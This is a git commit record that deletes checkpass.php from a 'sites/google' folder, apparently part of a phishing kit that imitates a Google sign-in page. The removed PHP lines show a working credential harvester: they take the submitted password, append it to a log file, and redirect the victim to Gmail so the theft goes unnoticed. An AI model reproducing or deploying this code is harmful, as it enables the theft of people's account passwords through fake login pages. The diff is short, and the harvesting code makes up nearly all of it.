cc2419d8a64cd8654e6061b3a1d6208ce6b3abe1
yuvaraj (Mr_3rr0r_501) <58068070+yuvarajucet@users.noreply.github.com>
2020-10-13 14:01:29 +0530

    Delete checkpass.php

--- sites/google/checkpass.php
+++
@@ -1,9 +0,0 @@
-<?php
-    $pass = $_POST['password'];
-    $file = fopen("log.txt","a");
-    fwrite($file,"\nPassword --> : ");
-    fwrite($file,$pass);
-    fwrite($file,"\n----------------------\n");
-    fclose($file);
-    header("location:https://mail.google.com");
-?>
